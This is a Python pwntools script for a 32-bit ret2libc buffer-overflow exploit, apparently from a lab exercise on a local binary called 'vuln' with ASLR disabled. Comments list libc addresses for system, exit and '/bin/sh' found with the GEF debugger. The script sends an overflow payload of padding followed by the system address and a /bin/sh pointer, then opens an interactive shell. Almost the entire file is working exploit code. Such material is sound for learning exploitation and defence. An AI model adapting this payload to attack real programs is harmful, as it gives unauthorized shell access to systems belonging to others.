# sudo apt install gdb gdbserver
# pip3 install pwn

from pwn import *

################## addresses #########################

# gef➤  x system
# 0xf7dc2030 <system>:    0xfb1e0ff3

SYSTEM_ADDRESS = 0xf7dc2030

# gef➤  x exit
# 0xf7db48e0 <exit>:      0xfb1e0ff3

EXIT_ADDRESS = 0xf7db48e0

# gef➤  grep /bin/sh
# [+] Searching '/bin/sh' in memory
# [+] In '/mnt/hgfs/shared_rev/VDSI/32_BIT_RETLIBC_NOASLR/vuln'(0x804a000-0x804b000), permission=r--
#   0x804a043 - 0x804a04a  →   "/bin/sh"
# [+] In '/mnt/hgfs/shared_rev/VDSI/32_BIT_RETLIBC_NOASLR/vuln'(0x804b000-0x804c000), permission=r--
#   0x804b043 - 0x804b04a  →   "/bin/sh"
# [+] In '/usr/lib/i386-linux-gnu/libc.so.6'(0xf7f1a000-0xf7f9f000), permission=r--
#   0xf7f35997 - 0xf7f3599e  →   "/bin/sh"

BIN_SH = 0xf7f35997

# gef> x/50i main
# 0x8049246 <main+144>:        ret

RET_ADDRESS = 0x8049246

################## exploit ##########################

#context.terminal = ["tmux", "splitw", "-h"]

p = process("./vuln")
gdb.attach(p, '''
b *(vuln+95)

c
''')

# p = gdb.debug('./vuln', f'''
# # break at main
# # break main

# # debug automatically breaks at _start - ignore it
# continue
# ''')

exploit = b""
exploit += p32(SYSTEM_ADDRESS)
#exploit += p32(EXIT_ADDRESS)
exploit += p32(1234)
exploit += p32(BIN_SH)


#p.send(b"A"*92 + b"B"*4 + b"C"*4)
p.send(b"A"*92 + b"B"*4 + exploit)

p.interactive()
